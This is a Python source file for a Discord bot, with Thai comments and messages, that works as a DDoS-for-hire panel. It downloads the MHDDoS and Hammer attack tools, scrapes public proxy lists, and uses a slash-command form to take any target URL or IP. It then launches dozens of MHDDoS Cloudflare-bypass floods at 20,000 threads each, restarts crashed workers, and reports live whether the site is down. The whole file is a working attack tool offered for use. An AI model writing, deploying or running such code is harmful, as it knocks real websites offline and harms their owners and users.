import os
import threading
import asyncio
import subprocess
import time
import requests
from flask import Flask
import discord
from discord import app_commands
from discord.ui import View, Button, Modal, TextInput

# --- ดาวน์โหลดเครื่องมือและอัปเดต Proxy อัตโนมัติ ---
if not os.path.exists("MHDDoS"):
    print("กำลังดาวน์โหลดเครื่องมือ MHDDoS...")
    subprocess.run(["git", "clone", "https://github.com/MatrixTM/MHDDoS.git"])

if not os.path.exists("hammer"):
    print("กำลังดาวน์โหลดเครื่องมือ Hammer...")
    subprocess.run(["git", "clone", "https://github.com/cyweb/hammer.git"])

def update_proxies():
    proxy_sources = [
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
    ]
    with open("proxy.txt", "w") as out:
        for src in proxy_sources:
            try:
                r = requests.get(src, timeout=3)
                if r.status_code == 200:
                    out.write(r.text + "\n")
            except:
                pass
    print("อัปเดต Proxy สำเร็จ!")

update_proxies()

# --- สร้าง Web Server เพื่อให้ Render รันบอทได้ตลอดเวลา ---
app = Flask('')

@app.route('/')
def home():
    return "Ultra DDoS Bot is running!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    threading.Thread(target=run_web).start()

# --- Discord Bot Setup ---
intents = discord.Intents.default()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

class DDoSModal(Modal, title="⚡ ระบบยิงอัลตร้า - เดียวรู้กัน"):
    target = TextInput(label="URL หรือ IP เว็บเป้าหมาย", placeholder="เช่น https://www.tona.com หรือ 1.2.3.4", required=True)
    port = TextInput(label="Port เว็บ", placeholder="เช่น 80 หรือ 443", required=True)
    machines = TextInput(label="จำนวนเครื่องหลัก (1 เครื่องแตกตัวคูณ)", placeholder="1 ถึง 10", default="5", required=True, max_length=2)
    duration = TextInput(label="ระยะเวลา (วินาที)", placeholder="500", default="500", required=True, max_length=4)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            mach = int(self.machines.value)
            dur = int(self.duration.value)
            if mach < 1: mach = 1
            if mach > 10: mach = 10
            if dur < 1: dur = 1
        except ValueError:
            await interaction.response.send_message("❌ กรุณากรอกตัวเลขให้ถูกต้อง!", ephemeral=True)
            return

        target_val = self.target.value.strip()
        port_val = self.port.value.strip()
        target_full = target_val if target_val.startswith("http") else f"http://{target_val}:{port_val}"
        
        multiplier = 3  # ตัวคูณทวีคูณเวิร์กเกอร์ไม่ให้เซิร์ฟเวอร์ล่ม
        total_workers = mach * multiplier
        threads_per_worker = 20000

        # 1. ตอบกลับ Discord ทันทีภายในเสี้ยววิ เพื่อป้องกันปัญหา "แอปไม่ตอบสนอง"
        embed = discord.Embed(
            title="🎯 เดียวรู้กัน - กำลังเริ่มกระบวนการ...",
            description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n💥 **กำลังเตรียมเวิร์กเกอร์:** `{total_workers} จุด`\n⏱️ **เวลา:** `{dur} วินาที`",
            color=discord.Color.orange()
        )
        await interaction.response.send_message(embed=embed, ephemeral=False)
        msg = await interaction.original_response()

        # 2. แยกงานหนักไปรันแบบ Background Task ไม่ให้บล็อกระบบหลัก
        async def background_attack():
            processes = []
            try:
                for _ in range(total_workers):
                    cmd_mh = ["python3", "MHDDoS/start.py", "CFB", target_full, "1", str(threads_per_worker), "proxy.txt", "100", str(dur)]
                    p1 = subprocess.Popen(cmd_mh, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    processes.append((cmd_mh, p1))
            except Exception as e:
                print(f"Error starting subprocesses: {e}")

            start_time = time.time()
            
            while True:
                elapsed = int(time.time() - start_time)
                if elapsed >= dur:
                    break
                
                # เช็คและรีสตาร์ทตัวที่หลุดอัตโนมัติ
                for idx, (cmd, p) in enumerate(processes):
                    if p.poll() is not None:
                        new_p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        processes[idx] = (cmd, new_p)

                # เช็คความเร็วเว็บแบบเรียลไทม์
                try:
                    res_start = time.time()
                    r = requests.get(target_full, timeout=2)
                    speed_ms = int((time.time() - res_start) * 1000)
                    status_code = r.status_code
                except:
                    speed_ms = 0
                    status_code = "0 (ไม่ตอบสนอง / DOWN สนิท ☠️🔥)"

                live_embed = discord.Embed(
                    title="🔥 เดียวรู้กัน - กำลังถล่มยับต่อเนื่อง...",
                    description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n⏱️ **เวลา:** `{elapsed} / {dur} วินาที`\n⚡ **ความเร็วตอบสนอง:** `{speed_ms} ms`\n📌 **สถานะเว็บ:** `{status_code}`\n🚀 **เวิร์กเกอร์:** `{total_workers} จุด`",
                    color=discord.Color.red()
                )
                try:
                    await msg.edit(embed=live_embed)
                except:
                    pass
                
                await asyncio.sleep(3)

            # ปิด Process ทั้งหมดเมื่อครบเวลา
            for _, p in processes:
                try:
                    p.terminate()
                except:
                    pass
            
            success_embed = discord.Embed(
                title="✅ สำเร็จแล้ว!",
                description=f"ถล่มเป้าหมาย `{target_val}:{port_val}` ครบถ้วนตามเวลา `{dur} วินาที` เรียบร้อย",
                color=discord.Color.green()
            )
            try:
                await msg.edit(embed=success_embed)
            except:
                pass

        # สั่งรันเบื้องหลังทันที
        asyncio.create_task(background_attack())

class DDoSView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 เริ่มถล่มอัลตร้า", style=discord.ButtonStyle.danger, custom_id="start_ddos_btn")
    async def button_callback(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(DDoSModal())

@tree.command(name="d", description="เปิดเมนูเดียวรู้กันอัลตร้า")
async def d_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔥 เดียวรู้กัน - Ultra Panel",
        description="กดปุ่มด้านล่างเพื่อใส่ข้อมูลเป้าหมาย",
        color=discord.Color.dark_red()
    )
    await interaction.response.send_message(embed=embed, view=DDoSView(), ephemeral=False)

@client.event
async def on_ready():
    await tree.sync()
    print(f"Logged in as {client.user}")

if __name__ == "__main__":
    keep_alive()
    TOKEN = os.getenv("BOT_TOKEN")
    if TOKEN:
        client.run(TOKEN)
    else:
        print("ERROR: ไม่พบ BOT_TOKEN ใน Environment Variables!")
